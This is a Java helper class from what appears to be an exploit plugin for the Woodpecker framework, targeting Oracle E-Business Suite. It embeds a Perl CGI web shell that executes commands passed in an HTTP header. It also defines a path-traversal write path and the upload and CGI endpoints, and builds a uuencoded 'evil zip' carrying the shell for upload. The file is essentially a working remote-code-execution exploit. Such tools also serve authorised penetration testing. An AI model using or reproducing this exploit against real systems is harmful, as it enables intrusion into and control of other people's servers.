package me.gv7.woodpecker.plugin;


import me.gv7.woodpecker.tools.common.FileUtil;
import sun.misc.UUEncoder;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * @Auther Zh1z3ven
 * @Date 2023/2/12 15:59
 */
public class CommonUtils {
    private static String  DEFAULT_txkFNDWRR_pl = "use CGI;\n" +
            "print CGI::header( -type => 'text/plain' );\n" +
            "my $cmd = CGI::http('HTTP_CMD');\n" +
            "print system($cmd);\n" +
            "exit;";
    public static String DEFAULT_PL_PATH = "../../../../../FMW_Home/Oracle_EBS-app1/common/scripts/txkFNDWRR.pl";
    public static String UPLOAD_ENDPOINT = "/OA_HTML/BneViewerXMLService?bne:uueupload=TRUE";
    public static String CGI_ENDPOINT = "/OA_CGI/FNDWRR.exe";
    public static String FROMS_ENDPOINT = "/forms/";


    public static String generateEvilZip(IResultOutput resultOutput, String compressName, String zipName, String zipSavePath) throws Exception{


        ZipOutputStream evilZipOutputStream = new ZipOutputStream(new FileOutputStream(zipSavePath));
        evilZipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
        evilZipOutputStream.putNextEntry(new ZipEntry(compressName));
        evilZipOutputStream.write(DEFAULT_txkFNDWRR_pl.getBytes());
        evilZipOutputStream.flush();
        resultOutput.infoPrintln("generate evil zip: " + zipName + " to " + compressName);
        evilZipOutputStream.close();
        byte[] bytes = Files.readAllBytes(Paths.get(zipSavePath));
        String payload = new UUEncoder(zipName).encodeBuffer(bytes);
        resultOutput.infoPrintln("uuencode evil zip: " + zipSavePath);
        return payload;
    }
    public static String generateEvilZip(IResultOutput resultOutput, String compressName, String zipName, String zipSavePath, String localfilepath) throws Exception{


        ZipOutputStream evilZipOutputStream = new ZipOutputStream(new FileOutputStream(zipSavePath));
        evilZipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
        evilZipOutputStream.putNextEntry(new ZipEntry(compressName));
        evilZipOutputStream.write(FileUtil.readFile(localfilepath));
        resultOutput.infoPrintln("get bytes from " + localfilepath);
        evilZipOutputStream.flush();
        resultOutput.infoPrintln("generate evil zip: " + zipName + " to " + compressName);
        evilZipOutputStream.close();
        byte[] bytes = Files.readAllBytes(Paths.get(zipSavePath));
        String payload = new UUEncoder(zipName).encodeBuffer(bytes);
        resultOutput.infoPrintln("uuencode evil zip save path: " + zipSavePath);
        return payload;
    }


}
